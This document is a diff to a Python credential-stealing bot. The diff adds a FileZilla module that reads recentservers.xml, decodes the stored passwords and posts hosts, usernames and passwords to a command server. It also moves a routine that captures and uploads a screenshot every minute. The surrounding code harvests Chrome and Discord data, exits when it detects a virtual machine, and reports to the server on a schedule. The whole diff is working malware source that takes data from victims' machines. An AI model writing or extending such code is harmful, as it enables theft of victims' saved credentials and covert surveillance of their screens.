@@ -14,6 +14,7 @@ import sqlite3
 import win32crypt
 from Crypto.Cipher import AES
 from PIL import ImageGrab
+import xml.etree.ElementTree as ET
 
 APP_DATA = os.environ['LOCALAPPDATA']
 API_URL = "http://localhost:4000"
@@ -112,12 +113,21 @@ class ApiController():
                 "version": uname.version,
                 "processor": uname.processor,
                 "architecture": uname.machine,
-                "boot_time": f"{bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}",
+                "boot_time": f"{bt.year}-{bt.month}-{bt.day} {bt.hour}:{bt.minute}:{bt.second}",
                 "cpu_cores": psutil.cpu_count(logical=True),
                 "memory": self.get_size(psutil.virtual_memory().total)
             }
 
             requests.post(f"{self.api_url}/update/details/{identifier}/{token}", json=post_data)
+
+    def update_screenshot(self, identifier, token):
+        if self.check_connection():
+            image = ImageGrab.grab()
+            image.save(self.screenshot_path)
+            
+            post_file = {"file": (self.screenshot_path, open(self.screenshot_path, "rb"))}
+
+            requests.post(f"{self.api_url}/update/screenshot/{identifier}/{token}", files=post_file)
 
     def update_chrome(self, identifier, token, data):
         if self.check_connection():
@@ -146,14 +156,17 @@ class ApiController():
 
             requests.post(f"{self.api_url}/update/discord/{identifier}/{token}", json=post_data)
 
-    def update_screenshot(self, identifier, token):
+    def update_filezilla(self, identifier, token, data):
         if self.check_connection():
-            image = ImageGrab.grab()
-            image.save(self.screenshot_path)
-            
-            post_file = {"file": (self.screenshot_path, open(self.screenshot_path, "rb"))}
+            for d in data:
+                post_data = {
+                    "host": d["host"],
+                    "port": d["port"],
+                    "user": d["user"],
+                    "password": d["pass"]
+                }
 
-            requests.post(f"{self.api_url}/update/screenshot/{identifier}/{token}", files=post_file)
+                requests.post(f"{self.api_url}/update/filezilla/{identifier}/{token}", json=post_data)
 
 class FileController():
     def __init__(self):
@@ -335,6 +348,35 @@ class Discord():
         self.neatify()
         return self.saved
 
+class Filezilla(object):
+
+    def __init__(self):
+        self.saved = []
+        self.grab_saved()
+
+    def grab_saved(self):
+        filezilla =  os.path.join(os.getenv("APPDATA"), "FileZilla")
+        if os.path.exists(filezilla):
+            saved_pass_file = os.path.join(filezilla, "recentservers.xml")
+            if os.path.exists(saved_pass_file):
+                xml_tree = ET.parse(saved_pass_file).getroot()
+                if xml_tree.findall('RecentServers/Server'):
+                    servers = xml_tree.findall('RecentServers/Server')
+                else:
+                    servers = xml_tree.findall('Servers/Server')
+ 
+                for server in servers:
+                    host = server.find('Host')
+                    port = server.find('Port')
+                    user = server.find('User')
+                    password = server.find('Pass')
+                    full_pass = base64.b64decode(password.text).decode()
+                    self.saved.append({"host": host.text, "port": port.text, "user": user.text, "pass": full_pass})
+
+    def dump(self):
+        self.grab_saved()
+        return self.saved
+
 def main():
     if(AntiVM().inVM()):
         exit()
@@ -357,6 +399,7 @@ def main():
                         main()
                     
                     if api.check_account(bot_identifier, bot_token):
+                        api.update_filezilla(bot_identifier, bot_token, Filezilla().dump())
                         schedule.every(1).minutes.do(api.update_details, bot_identifier, bot_token)
                         schedule.every(1).minutes.do(api.update_screenshot, bot_identifier, bot_token)
                         schedule.every(1).minutes.do(api.update_chrome, bot_identifier, bot_token, Chrome().dump())
